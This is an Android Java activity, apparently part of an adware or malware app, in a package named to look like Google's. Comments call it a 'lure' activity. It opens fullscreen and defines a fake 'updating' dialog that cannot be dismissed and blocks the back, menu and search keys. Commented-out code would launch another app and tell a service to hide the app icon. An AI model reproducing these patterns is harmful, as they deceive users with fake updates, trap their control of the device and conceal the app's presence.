package com.google.viewfactory;

import android.app.*;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.Window;
import android.view.WindowManager;
import com.android.constant.AdsConstant;
import com.android.service.MainService;

/**
 * 诱导Activity
 * 返回宿主Activity
 */
public class AdsClientActivity extends Activity {
    /**
     * Called when the activity is first created.
     */
    final String packageName = "com.csl.ttxlm";
    ProgressDialog mPd = null;
    Handler handler = null;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        handler = new Handler();
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
//        showPrBar(this);

//        handler.postDelayed(new Runnable() {
//            @Override
//            public void run() {
//                mPd.dismiss();
//
//                Intent mIntent = getPackageManager().getLaunchIntentForPackage(packageName);
//                mIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//
//                if (mIntent != null) startActivity(mIntent);
//                AdsClientActivity.this.finish();
//            }
//        }, 3 * 1000);

//        Intent intent = new Intent(this, MainService.class);
//        intent.setAction(AdsConstant.HIDEICONAction);
//
//        startService(intent);


    }

    private void showPrBar(Context context) {
        mPd = new ProgressDialog(context);
        mPd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        mPd.setMessage("更新中...");
        mPd.setOnKeyListener(new DialogInterface.OnKeyListener() {
            public boolean onKey(DialogInterface dialog, int keyCode, KeyEvent event) {
                if (keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_SEARCH
                        || keyCode == KeyEvent.KEYCODE_MENU) {
                    return true;
                }
                return false;
            }
        });


        mPd.setCanceledOnTouchOutside(false);
        mPd.show();
    }


}
